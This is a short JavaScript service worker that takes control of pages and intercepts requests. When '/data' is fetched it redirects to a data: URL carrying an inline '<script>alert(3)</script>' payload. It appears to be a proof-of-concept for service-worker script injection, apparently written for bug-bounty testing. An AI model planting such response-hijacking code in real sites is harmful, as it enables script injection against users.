// Add JS here
self.addEventListener('install', function(event) {
    event.waitUntil(self.skipWaiting());
  });
  self.addEventListener('activate', function(event) {
    event.waitUntil(self.clients.claim());
  });
  
  onfetch=e=>{
    console.log(e.request.url);
    if(e.request.url=="/data"){
        console.log("match");
      e.respondWith(fetch("/").then(()=>{
          return Response.redirect("data://hackerone.com/html,<script>alert(3)</script>");
      }));
    }
  }
  
